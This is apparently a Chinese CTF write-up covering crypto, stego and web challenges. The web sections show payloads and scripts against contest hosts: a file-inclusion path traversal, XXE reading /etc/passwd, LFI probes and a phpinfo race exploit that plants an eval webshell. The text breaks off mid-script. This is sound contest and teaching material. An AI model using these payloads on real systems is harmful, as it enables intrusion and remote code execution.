<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.open(&quot;f1.png&quot;).convert(&quot;L&quot;)</span><br><span class="line"></span><br><span class="line">im2 = Image.open(&quot;f2.png&quot;).convert(&quot;L&quot;)</span><br><span class="line"></span><br><span class="line">width=im.size[0]  #图片宽</span><br><span class="line"></span><br><span class="line">height=im.size[1] #图片高</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dd=&apos;&apos;</span><br><span class="line"></span><br><span class="line">flag1=&apos;&apos;</span><br><span class="line"></span><br><span class="line">for x in range(0,width):</span><br><span class="line"></span><br><span class="line">    for y in range(0,height):</span><br><span class="line"></span><br><span class="line">        data  = im .getpixel((x,y)) </span><br><span class="line"></span><br><span class="line">        data2 = im2.getpixel((x,y))</span><br><span class="line"></span><br><span class="line">        if(data!=255 or data2!=255):</span><br><span class="line"></span><br><span class="line">        	dd=dd+str(data-data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range (int(len(dd)/8)):</span><br><span class="line"></span><br><span class="line">    word = dd[i*8:(i+1)*8]</span><br><span class="line"></span><br><span class="line">    word = int(word,2)</span><br><span class="line"></span><br><span class="line">    flag1 +=chr(int(word))</span><br><span class="line"></span><br><span class="line">missing_padding = 4 - len(flag1)%4</span><br><span class="line"></span><br><span class="line">if missing_padding:</span><br><span class="line"></span><br><span class="line">    flag1+= &apos;=&apos;*missing_padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1)</span><br><span class="line"></span><br><span class="line">pic = open(&apos;flag.png&apos;,&apos;wb&apos;)</span><br><span class="line"></span><br><span class="line">pic.write(flag)</span><br><span class="line"></span><br><span class="line">pic.close()</span><br></pre></td></tr></table></figure>

<p>得到一张图片，但是打不开，看他的十六进制数据发现文件头被改了。改回来后得到一张二维码，扫码得到flag</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/6.png" alt="6"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>题目文件是public.pem 和 flag.enc，先用openssl打开.pem文件</p>
<p>openssl rsa -pubin -text -modulus -in public.pem</p>
<p>得到</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/7.png" alt="7"></p>
<p>其中。N=&gt;Modulus，e=&gt;Exponent</p>
<p>没有更多信息与算法了，猜测这个大数可以直接分解，上yafu。随后用rsatool生成.pem文件，再用openssl解密flag.enc，得到字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;Y!s04tEP&#123;ygraCl_f</span><br></pre></td></tr></table></figure>

<p>栅栏加方向即可得到flag，</p>
<p>rsatool和openssl的使用参考</p>
<p><a href="https://www.cnblogs.com/Byqiyou/p/9410885.html" target="_blank" rel="noopener">https://www.cnblogs.com/Byqiyou/p/9410885.html</a></p>
<h3 id="川流不息"><a href="#川流不息" class="headerlink" title="川流不息"></a>川流不息</h3><p>题目加密脚本和密文</p>
<p>加密脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from parameters import a</span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    if len(init) &lt; 5:</span><br><span class="line">        return init</span><br><span class="line">    result = init[:5]</span><br><span class="line">    for index in range(size-5):</span><br><span class="line">        mid = (result[index] * a[0]) ^ (result[index + 1] * a[1]) ^ (result[index + 2] * a[2]) ^ (result[index + 3] * a[3]) ^ (result[index+4] * a[4])</span><br><span class="line">        result.append(mid)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    with open(&apos;flag&apos;,&apos;r&apos;) as f:</span><br><span class="line">        flag = f.readline().strip()</span><br><span class="line">    plain = &apos;&apos;.join(bin(ord(i))[2:].rjust(8,&apos;0&apos;) for i in flag)</span><br><span class="line">    key = stream([1,0,0,1,1,0,1,0,0,1],len(plain))</span><br><span class="line">    cipher = &apos;&apos;</span><br><span class="line">    for i in range(len(plain)):</span><br><span class="line">        cipher += str(int(plain[i]) ^ key[i])</span><br><span class="line">    print cipher</span><br></pre></td></tr></table></figure>

<p>首先，根据flag前五个字符“flag{”和密文，异或可以得到key的前四十个值，然后爆破得到a</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    key=[1,0,0,1,1,0,1,0,0,1,0,0,0,0,1,0,1,0,1,1,1,0,1,1,0,0,0,1,1,1,1,1,0,0,1,1,0,1,0,0]</span><br><span class="line">    for i in range(2):</span><br><span class="line">        for j in range(2):</span><br><span class="line">            for k in range(2):</span><br><span class="line">                for p in range(2):</span><br><span class="line">                    for q in range(2):</span><br><span class="line">                        a=[i,j,k,p,q]</span><br><span class="line">                        result = init[:5]</span><br><span class="line">                        for index in range(size-5):</span><br><span class="line">                            mid = (result[index] * a[0]) ^ (result[index + 1] * a[1]) ^ (result[index + 2] * a[2]) ^ (result[index + 3] * a[3]) ^ (result[index+4] * a[4])</span><br><span class="line">                            result.append(mid)</span><br><span class="line">                        if result==key:</span><br><span class="line">                            print(a)</span><br><span class="line">                            break</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    </span><br><span class="line">    flag = &quot;flag&#123;&quot;</span><br><span class="line">    plain = &apos;&apos;.join(bin(ord(i))[2:].rjust(8,&apos;0&apos;) for i in flag)</span><br><span class="line">    stream([1,0,0,1,1,0,1,0,0,1],len(plain))</span><br></pre></td></tr></table></figure>

<p>得到a=[1, 0, 0, 1, 0]</p>
<p>然后根据加密脚本，获得key。然后key与密文异或得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    if len(init) &lt; 5:</span><br><span class="line">        return init</span><br><span class="line">    result = init[:5]</span><br><span class="line">    for index in range(size-5):</span><br><span class="line">        mid = (result[index] * a[0]) ^ (result[index + 1] * a[1]) ^ (result[index + 2] * a[2]) ^ (result[index + 3] * a[3]) ^ (result[index+4] * a[4])</span><br><span class="line">        result.append(mid)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    a=[1, 0, 0, 1, 0]</span><br><span class="line">    cipher = &apos;111111000010111011011010011110000100111111010110000000100100110000001100011010111000000100100011100100010111110010101000100100011100000101011001111011101001101000111011000010000000011010000111111000111101011110111010&apos;</span><br><span class="line">    flag=&apos;&apos;</span><br><span class="line">    key = stream([1,0,0,1,1,0,1,0,0,1],len(cipher))</span><br><span class="line">    for i in range(len(cipher)):</span><br><span class="line">        flag += str(int(cipher[i]) ^ key[i])</span><br><span class="line"></span><br><span class="line">    for i in range(0,len(flag),8):</span><br><span class="line"></span><br><span class="line">        print(chr(int(flag[i:i+8],2)),end=&quot;&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="base-1"><a href="#base-1" class="headerlink" title="base_1"></a>base_1</h3><p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/8.png" alt="8"></p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.76.51.219:8050/?base=bXlmbGFn</span><br></pre></td></tr></table></figure>

<p>得到回显 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能输入bXlmbGFn！</span><br></pre></td></tr></table></figure>

<p>但经过测试，发现被加密后的base64字符串解密时似乎会舍弃密文末尾多余的字符（取余4后多出来的字符），于是这题就不难绕过了，</p>
<p>最终payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.76.51.219:8050/?base=bXlmbGFn1</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h3 id="truncation"><a href="#truncation" class="headerlink" title="truncation"></a>truncation</h3><p>进入网站，f12，发现注释：</p>
<p>进入sorce.php发现源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class kind</span><br><span class="line">&#123;</span><br><span class="line">public static function checkFile(&amp;$page)</span><br><span class="line">&#123;</span><br><span class="line">        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;aa&quot;=&gt;&quot;aa.php&quot;];</span><br><span class="line"></span><br><span class="line">        if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">        echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">        return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; kind::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">       echo &quot;&lt;h&gt;Look carefully and you will find the answer.&lt;/h&gt;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>先进入click.php，发现：flag is not here, and flag in flag.php 得到了ﬂag的位置，那么应该是考任意文件包含漏洞</p>
<p>审计代码得到：</p>
<p>要设定page的值，且内容要在whiteList中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_substr($page,0,mb_strpos($page.&apos;?&apos;,&apos;?&apos;))</span><br></pre></td></tr></table></figure>

<p>表示截取page中？之前的内容 接着对$page进行一次URLdecode之后，再判断一次。最后ﬁle的值为一个字符串 且 checkﬁle返回真值 就能包含文件ﬁle</p>
<p>所以最终payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.110.227.208:8003/index.php?file=source.php?../../flag.php</span><br></pre></td></tr></table></figure>

<p>得到一个猜密码的界面    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;猜密码&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;pwd&apos;]=time();</span><br><span class="line">if (isset ($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">        if ($_POST[&apos;pwd&apos;] == $_SESSION[&apos;pwd&apos;])</span><br><span class="line">                die(&apos;Flag:&apos;.$flag);</span><br><span class="line">        else&#123;</span><br><span class="line">                print &apos;&lt;p&gt;猜测错误.&lt;/p&gt;&apos;;</span><br><span class="line">                $_SESSION[&apos;pwd&apos;]=time().time();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">密码：&lt;input type=&quot;text&quot; name=&quot;pwd&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;猜密码&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>需要post一个赋值了的password和一个和服务器时间的值相同的pwd，脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from bs4 import BeautifulSoup       #html解析器</span><br><span class="line">url=&quot;http://47.110.227.208:8003/index.php?file=source.php?../../flag.php&quot;    #目标url</span><br><span class="line"></span><br><span class="line">session=requests.session()          #获取一个session对象</span><br><span class="line">response=session.get(url)</span><br><span class="line">html=response.text                  #返回的页面</span><br><span class="line">soup=BeautifulSoup(html,&apos;html.parser&apos;)</span><br><span class="line"></span><br><span class="line">formData=&#123;&quot;password&quot;:&quot;123&quot;,&quot;pwd&quot;:&quot;int(time.time())&quot;&#125;#构建一个formData，用于传我们的</span><br><span class="line">re2=session.post(url,data=formData)#post过去</span><br><span class="line"></span><br><span class="line">if(&quot;猜测错误&quot; not  in re2.text):</span><br><span class="line">	print(re2.text)</span><br></pre></td></tr></table></figure>

<p>发现无法获得flag，后来发现pwd赋值为空可以获得flag，可能是<strong>$_SESSION[‘pwd’]=time();</strong>没有执行成功。</p>
<h3 id="Simple-XXE"><a href="#Simple-XXE" class="headerlink" title="Simple XXE"></a>Simple XXE</h3><p>首先，了解一下XXE，（xml外部实体注入漏洞）</p>
<p>参考文章：<a href="https://www.cnblogs.com/cui0x01/p/8823690.html" target="_blank" rel="noopener">https://www.cnblogs.com/cui0x01/p/8823690.html</a></p>
<p>（然后跟这个文章走2333）</p>
<p>首先f12看到dom.php存在XXE，于是构造XML文本先验证漏洞，</p>
<p>这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中<code>SYSTEM &quot;file:///etc/passwd&quot;</code>部分引用了目标服务器(即<code>172.16.12.2</code>)下的<code>/etc/passwd</code>文件，服务器解析XML内容后，会将这一文件内容存入<code>&amp;xxe</code>中，然后将数据返回给恶意访问者。</p>
<p>执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上<code>/etc/passwd</code>文件的内容</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/9.png" alt="9"></p>
<p>漏洞验证成功，</p>
<p>于是修改XML中的外部实体为其他协议，根据提示看hint，<code>php://filter/read=convert.base64-encode/resource=hint.php</code>，在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/10.png" alt="10"></p>
<p>解码后得到目录，<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/11.png" alt="11"></p>
<p>于是</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/12.png" alt="12"></p>
<p>解码得到flag</p>
<h3 id="inclusion"><a href="#inclusion" class="headerlink" title="inclusion"></a>inclusion</h3><p>进入页面，f12，发现注释 phpinfo.php</p>
<p>然后根据名字，猜测是php文件包含漏洞（利用phpinfo）</p>
<p>参考这篇文章（又是跟着文章走）<a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a></p>
<p>访问<a href="http://47.110.227.208:8001/lfi.php?file=/etc/passwd" target="_blank" rel="noopener">http://47.110.227.208:8001/lfi.php?file=/etc/passwd</a>验证漏洞，<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/13.png" alt="13"></p>
<p>成功。</p>
<p>文章如是说：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">先讲一下利用phpinfo上传文件，然后在文件包含的原理：</span><br><span class="line"></span><br><span class="line">参考链接：https://github.com/vulhub/vulhub/tree/master/php/inclusion</span><br><span class="line"></span><br><span class="line">在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。</span><br><span class="line"></span><br><span class="line">因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。</span><br><span class="line"></span><br><span class="line">但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：</span><br><span class="line"></span><br><span class="line">1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；</span><br><span class="line"></span><br><span class="line">2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大</span><br><span class="line"></span><br><span class="line">3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接</span><br><span class="line"></span><br><span class="line">4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包</span><br><span class="line"></span><br><span class="line">5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除</span><br><span class="line"></span><br><span class="line">6）我们可以利用这个时间差，成功包含临时文件，最后getshell</span><br></pre></td></tr></table></figure>

<p>利用脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python </span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG=&quot;Security Test&quot;</span><br><span class="line">    PAYLOAD=&quot;&quot;&quot;%s\r</span><br><span class="line">&lt;?php file_put_contents(&apos;/tmp/g&apos;, &apos;&lt;?=eval($_REQUEST[1])?&gt;&apos;)?&gt;\r&quot;&quot;&quot; % TAG</span><br><span class="line">    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span><br><span class="line">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span><br><span class="line">Content-Type: text/plain\r</span><br><span class="line">\r</span><br><span class="line">%s</span><br><span class="line">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD</span><br><span class="line">    padding=&quot;A&quot; * 5000</span><br><span class="line">    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\r</span><br><span class="line">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r</span><br><span class="line">HTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="line">Content-Length: %s\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span 